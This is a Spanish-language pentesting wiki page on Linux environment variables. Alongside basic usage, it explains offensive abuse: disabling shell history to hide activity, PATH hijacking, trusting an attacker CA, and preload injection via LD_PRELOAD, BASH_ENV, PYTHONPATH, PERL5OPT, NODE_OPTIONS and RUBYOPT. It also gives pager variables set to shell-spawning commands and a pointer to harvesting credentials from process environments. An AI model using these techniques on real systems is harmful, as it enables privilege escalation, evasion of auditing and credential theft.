# Variables de entorno de Linux

{{#include ../../banners/hacktricks-training.md}}

## Variables globales

Las variables globales **serán** heredadas por los **procesos secundarios**.

Puedes crear una variable global para tu sesión actual haciendo:
```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```
Esta variable estará accesible para tus sesiones actuales y sus procesos secundarios.

Puedes **eliminar** una variable haciendo:
```bash
unset MYGLOBAL
```
## Variables locales

Las **variables locales** solo pueden ser **accedidas** por el **shell/script actual**.
```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```
## Listar las variables actuales
```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```
El contenido de `/proc/*/environ` está **separado por NUL**, por lo que estas variantes suelen ser más fáciles de leer:
```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```
Si buscas **credenciales** o **configuración interesante de servicios** dentro de entornos heredados, consulta también [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md).

## Variables comunes

De: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/)

- **DISPLAY**: la pantalla utilizada por **X**. Esta variable normalmente se establece en **:0.0**, lo que significa la primera pantalla del ordenador actual.
- **EDITOR**: el editor de texto preferido del usuario.
- **HISTFILESIZE**: el número máximo de líneas contenidas en el archivo de historial.
- **HISTSIZE**: número de líneas añadidas al archivo de historial cuando el usuario termina su sesión.
- **HOME**: tu directorio personal.
- **HOSTNAME**: el nombre de host del ordenador.
- **LANG**: tu idioma actual.
- **MAIL**: la ubicación del buzón de correo del usuario. Normalmente **/var/spool/mail/USER**.
- **MANPATH**: la lista de directorios en los que se deben buscar las páginas del manual.
- **OSTYPE**: el tipo de sistema operativo.
- **PS1**: el prompt predeterminado en bash.
- **PATH**: almacena las rutas de todos los directorios que contienen archivos binarios que quieres ejecutar especificando únicamente el nombre del archivo, en lugar de una ruta relativa o absoluta.
- **PWD**: el directorio de trabajo actual.
- **SHELL**: la ruta al shell de comandos actual (por ejemplo, **/bin/bash**).
- **TERM**: el tipo de terminal actual (por ejemplo, **xterm**).
- **TZ**: tu zona horaria.
- **USER**: tu nombre de usuario actual.

## Variables interesantes para hacking

No todas las variables son igual de útiles. Desde una perspectiva ofensiva, prioriza las variables que modifican **rutas de búsqueda**, **archivos de inicio**, **comportamiento del dynamic linker** o **auditoría/registro**.

### **HISTFILESIZE**

Cambia el **valor de esta variable a 0** para que, cuando **termines tu sesión**, el **archivo de historial** (\~/.bash_history) se **trunque a 0 líneas**.
```bash
export HISTFILESIZE=0
```
### **HISTSIZE**

Cambia el **valor de esta variable a 0**, para que los comandos **no se guarden en el historial en memoria** y no se escriban en el **archivo de historial** (\~/.bash_history).
```bash
export HISTSIZE=0
```
### **HISTCONTROL**

Si el **valor de esta variable está establecido en `ignorespace` o `ignoreboth`**, cualquier comando precedido por un espacio adicional no se guardará en el historial.
```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```
### **HISTFILE**

Apunta el **archivo de historial** a **`/dev/null`** o desactívalo por completo. Esto suele ser más fiable que cambiar únicamente el tamaño del historial.
```bash
export HISTFILE=/dev/null
unset HISTFILE
```
### http_proxy & https_proxy

Los procesos usarán el **proxy** declarado aquí para conectarse a Internet mediante **http o https**.
```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```
### all_proxy y no_proxy

- `all_proxy`: proxy predeterminado para herramientas/protocolos que lo respetan.
- `no_proxy`: lista de bypass (hosts/dominios/CIDR) que deben conectarse directamente.
```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```
Pueden usarse las variantes en minúsculas y mayúsculas dependiendo de la herramienta (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

Los procesos confiarán en los certificados indicados en **estas variables de entorno**. Esto resulta útil para hacer que herramientas como **`curl`**, **`git`**, los clientes HTTP de Python o los gestores de paquetes confíen en una CA controlada por el atacante (por ejemplo, para hacer que un proxy de interception parezca legítimo).
```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```
### **PATH**

Si un wrapper/script privilegiado ejecuta comandos **sin rutas absolutas**, el **primer directorio controlado por el atacante** en `PATH` tiene prioridad. Este es el mecanismo detrás de muchos **PATH hijacks** en `sudo`, trabajos de cron, shell wrappers y helpers SUID personalizados. Busca `env_keep+=PATH`, un `secure_path` débil o wrappers que llamen a `tar`, `service`, `cp`, `python`, etc. por nombre.
```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```
Para conocer cadenas completas de escalada de privilegios que abusan de `PATH`, consulta [Linux Privilege Escalation](linux-privilege-escalation/README.md).

### **HOME & XDG_CONFIG_HOME**

`HOME` no es solo una referencia a un directorio: muchas herramientas cargan automáticamente **dotfiles**, **plugins** y **configuración por usuario** desde `$HOME` o `$XDG_CONFIG_HOME`. Si un flujo de trabajo privilegiado conserva estos valores, la **inyección de configuración** puede ser más sencilla que el secuestro de binarios.
```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```
Los objetivos interesantes incluyen `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py` y archivos específicos de herramientas, como `.terraformrc`.

### **LD_PRELOAD, LD_LIBRARY_PATH y LD_AUDIT**

Estas variables influyen en el **enlazador dinámico**:

- `LD_PRELOAD`: fuerza la carga anticipada de objetos compartidos adicionales.
- `LD_LIBRARY_PATH`: antepone directorios de búsqueda de bibliotecas.
- `LD_AUDIT`: carga bibliotecas auditoras que observan la carga de bibliotecas y la resolución de símbolos.

Son extremadamente valiosas para **hooking**, **instrumentation** y **escalada de privilegios** si un comando privilegiado las conserva. En el modo de **secure-execution** (`AT_SECURE`, por ejemplo, setuid/setgid/capabilities), el loader elimina o restringe muchas de estas variables. Sin embargo, los errores del parser en esa etapa temprana del loader siguen teniendo un gran impacto porque se ejecutan **antes** que el programa objetivo.
```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```
### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` cambia el comportamiento inicial de glibc (por ejemplo, los tunables del allocator) y resulta muy útil en exploit labs. También es relevante desde el punto de vista de la seguridad porque el **cargador dinámico lo analiza en una fase muy temprana**. El bug **Looney Tunables** de 2023 fue un buen recordatorio de que una única variable de entorno analizada por el cargador puede convertirse en una **primitive de escalada de privilegios local** contra programas SUID.
```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```
### **BASH_ENV & ENV**

Si **Bash** se inicia de forma **no interactiva**, comprueba `BASH_ENV` y carga ese archivo antes de ejecutar el script objetivo. Cuando Bash se invoca como `sh`, o en modo interactivo estilo POSIX, también puede consultar `ENV`. Esta es una forma clásica de convertir un wrapper de shell en ejecución de código si el entorno está controlado por el atacante.
```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```
Bash deshabilita estos archivos de inicio cuando los **IDs reales/efectivos difieren**, a menos que se use `-p`, por lo que el comportamiento exacto depende de cómo el wrapper invoque el shell. Ten cuidado con los wrappers privilegiados que llaman a `setuid()`/`setgid()` **antes** de lanzar Bash: una vez que los IDs vuelven a coincidir, Bash puede confiar en `BASH_ENV`, `ENV` y el estado relacionado del shell que, de otro modo, ignoraría.

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP y PYTHONINSPECT**

Estas variables cambian cómo se inicia Python:

- `PYTHONPATH`: antepone rutas de búsqueda de imports.
- `PYTHONHOME`: reubica el árbol de la standard library.
- `PYTHONSTARTUP`: ejecuta un archivo antes del prompt interactivo.
- `PYTHONINSPECT=1`: entra en modo interactivo después de que finaliza un script.

Son útiles contra scripts de mantenimiento, debuggers, shells y wrappers que llaman a Python con un entorno controlable. `python -E` y `python -I` ignoran todas las variables `PYTHON*`.
```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode
```
Un ejemplo real reciente fue el LPE de **needrestart** de 2024 en sistemas Ubuntu/Debian: el scanner propiedad de root copiaba el `PYTHONPATH` de un proceso sin privilegios desde `/proc/<PID>/environ` y luego ejecutaba Python. El exploit publicado colocaba `importlib/__init__.so` en la ruta controlada por el atacante, de modo que Python ejecutaba código del atacante durante su propia inicialización, antes de que el script codificado directamente en el helper siquiera importara.

### **PERL5OPT & PERL5LIB**

Perl tiene variables de inicio igual de útiles:

- `PERL5LIB`: anteponer directorios de librerías.
- `PERL5OPT`: inyectar switches como si estuvieran en la línea de comandos de cada `perl`.

Esto puede forzar la **carga automática de módulos** o cambiar el comportamiento del intérprete antes de que el script objetivo haga algo interesante. Perl ignora estas variables en contextos de **taint / setuid / setgid**, pero siguen siendo muy relevantes para wrappers normales ejecutados como root, trabajos de CI, instaladores y reglas personalizadas de sudoers.
```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```
### **NODE_OPTIONS**

`NODE_OPTIONS` antepone **flags de CLI de Node.js** a cada proceso `node` que hereda el entorno. Esto lo hace útil contra wrappers, trabajos de CI, helpers de Electron y reglas de sudo que finalmente ejecutan Node. Los flags más interesantes desde el punto de vista ofensivo suelen ser:

- `--require <file>`: precarga un archivo CommonJS antes del script objetivo.
- `--import <module>`: precarga un módulo ES antes del script objetivo.

Node rechaza algunos flags peligrosos en `NODE_OPTIONS`, pero `--require` y `--import` están permitidos explícitamente y se procesan **antes** de los argumentos normales de la línea de comandos.
```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```
Para cadenas de gadgets remotas que establecen `NODE_OPTIONS` indirectamente (por ejemplo, de prototype-pollution a RCE), consulta [esta otra página](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md).

### **RUBYLIB y RUBYOPT**

Ruby ofrece la misma clase de abuso durante el inicio:

- `RUBYLIB`: antepone directorios a la ruta de carga de Ruby.
- `RUBYOPT`: inyecta opciones de línea de comandos, como `-r`, en cada invocación de `ruby`.
```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```
Las vulnerabilidades de **needrestart** de 2024 demostraron que esto no es solo un truco de laboratorio: el mismo helper propiedad de root que era vulnerable al abuso de `PYTHONPATH` también podía ser obligado a ejecutar Ruby con un `RUBYLIB` controlado por el atacante, cargando `enc/encdb.so` desde un directorio controlado por el atacante.

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

Algunas herramientas no se limitan a leer una ruta del entorno; pasan el valor a un **shell**, un **editor** o un **preprocesador de entrada**. Esto hace que las siguientes variables sean especialmente interesantes cuando un wrapper privilegiado ejecuta `git`, `man`, `less` o visores de texto similares:

- `PAGER`, `MANPAGER`, `GIT_PAGER`: seleccionan el comando paginador.
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: seleccionan el comando del editor, a menudo con argumentos.
- `LESSOPEN`, `LESSCLOSE`: definen preprocesadores y postprocesadores que se ejecutan cuando `less` abre un archivo.
```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```
Git también admite la **inyección de configuración solo mediante variables de entorno** sin tocar el disco mediante `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>` y `GIT_CONFIG_VALUE_<n>`:
```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```
Desde la perspectiva de post-exploitation, recuerda también que los entornos heredados suelen contener **credenciales**, **configuración de proxy**, **tokens de servicio** o **claves cloud**. Consulta [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md) para buscar en `/proc/<PID>/environ` y en `Environment=` de `systemd`.

### PS1

Cambia el aspecto de tu prompt.

[**Este es un ejemplo**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: Este es un ejemplo](<../images/image (897).png>)

Usuario normal:

![PERL5OPT & PERL5LIB - PS1: Uno, dos y tres trabajos ejecutados en segundo plano](<../images/image (740).png>)

Uno, dos y tres trabajos ejecutados en segundo plano:

![PERL5OPT & PERL5LIB - PS1: Uno, dos y tres trabajos ejecutados en segundo plano](<../images/image (145).png>)

Un trabajo en segundo plano, uno detenido y el último comando no terminó correctamente:

![PERL5OPT & PERL5LIB - PS1: Un trabajo en segundo plano, uno detenido y el último comando no terminó correctamente](<../images/image (715).png>)

## Referencias

- [GNU Bash Manual - Archivos de inicio de Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [ld.so(8) - Página del manual de Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [Qualys - LPEs en needrestart](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [Documentación de CLI de Node.js - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)

{{#include ../../banners/hacktricks-training.md}}
